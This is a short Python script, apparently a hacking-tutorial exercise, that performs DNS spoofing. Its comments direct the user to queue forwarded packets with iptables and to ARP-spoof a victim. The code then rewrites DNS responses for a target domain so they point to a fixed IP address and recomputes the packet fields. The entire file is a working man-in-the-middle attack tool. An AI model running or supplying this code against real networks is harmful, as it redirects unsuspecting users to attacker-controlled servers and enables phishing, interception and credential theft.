# run iptables -I FORWARD -j NFQUEUE --queue-num 0(PS only for linux with net-tools installed.)
# and do arp spoofing
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.DNSRR in scapy_packet:
        # it is dns spoof
        domain = 'example.com'
        if domain in scapy_packet[scapy.DNSQR].qname:
            # got the website doom
            print "[+] Spoofing packet"

            answer = scapy.DNSRR(rrname=scapy_packet[scapy.DNSQR].qname, rdata="198.143.141.69")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum

            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
